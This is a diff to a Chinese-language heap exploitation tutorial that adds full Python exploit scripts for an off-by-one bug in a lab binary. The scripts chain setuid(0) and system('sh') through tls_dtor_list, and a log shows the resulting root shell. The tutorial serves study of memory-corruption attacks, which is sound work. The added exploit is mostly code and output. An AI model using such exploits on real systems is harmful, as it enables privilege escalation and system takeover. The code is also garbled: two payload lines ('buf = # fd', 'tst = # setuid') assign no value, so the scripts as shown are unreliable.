@@ -180,7 +180,7 @@ sh = 0x80482ce
 #endianess convertion
 def conv(num):
  return struct.pack("<I",num)
-buf = ?
+buf = # fd
 buf += conv(bk)
 buf += conv(fd_nextsize)
 buf += conv(bk_nextsize)
@@ -205,4 +205,64 @@ $
 
 ## 0X05 为什么没能获取root shell
 
-当 `uid != euid` 时，/bin/bash会丢弃权限。我们的二进制文件 ’consolidate _forward’ 的真实uid=1000，有效uid=0。 由于真实uid!=有效uid，因此当 system() 被调用时，bash会丢弃权限。为了解决这个问题，我们需要在执行system()之前调用setuid(0)，由于_call_tls_dtors 遍历 tls_dtor_list 并一个一个调用其中的函数，我们需要链接 setuid() 和 system() 。    
+当 `uid != euid` 时，/bin/bash会丢弃权限。我们的二进制文件 ’consolidate _forward’ 的真实uid=1000，有效uid=0。 由于真实uid!=有效uid，因此当 system() 被调用时，bash会丢弃权限。为了解决这个问题，我们需要在执行system()之前调用setuid(0)，由于_call_tls_dtors 遍历 tls_dtor_list 并一个一个调用其中的函数，我们需要链接 setuid() 和 system() 。  
+Full Exploit Code:  
+``` python
+#gen_file.py
+#!/usr/bin/env python
+import struct
+
+#dtor_list
+setuid = 0x4e123e30
+setuid_arg = 0x0
+mp = 0x804b020
+nxt = 0x804b430
+
+#endianess convertion
+def conv(num):
+ return struct.pack("<I",num)
+tst = # setuid
+tst += conv(setuid_arg)
+tst += conv(mp)
+tst += conv(nxt)
+
+print tst
+-----------------------------------------------------------------------------------------------------------------------------------
+#exp.py
+#!/usr/bin/env python
+import struct
+from subprocess import call
+
+fd = 0x0804b418
+bk = 0x0804b418
+fd_nextsize = 0xb7fe86c0
+bk_nextsize = 0x804b008
+system = 0x4e0a86e0
+sh = 0x80482ce
+
+#endianess convertion
+def conv(num):
+ return struct.pack("<I",num)
+buf = # fd
+buf += conv(bk)
+buf += conv(fd_nextsize)
+buf += conv(bk_nextsize)
+buf += conv(system)
+buf += conv(sh)
+buf += "A" * 996
+
+print "Calling vulnerable program"
+call(["./consolidate_forward", buf])
+```
+Executing above exploit code gives us root shell!!  
+``` bash
+$ python gen_file.py > inp_file
+$ python exp.py 
+Calling vulnerable program
+sh-4.2# id
+uid=0(root) gid=1000(sploitfun) groups=0(root),10(wheel),1000(sploitfun) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-4.2# exit
+exit
+$
+```
+Our off-by-one vulnerable code consolidates chunks in forward direction, similarly chunks can also be consolidated in backward direction. Such off-by-one vulnerable codes which consolidates chunks in backward direction can also be exploited!!        
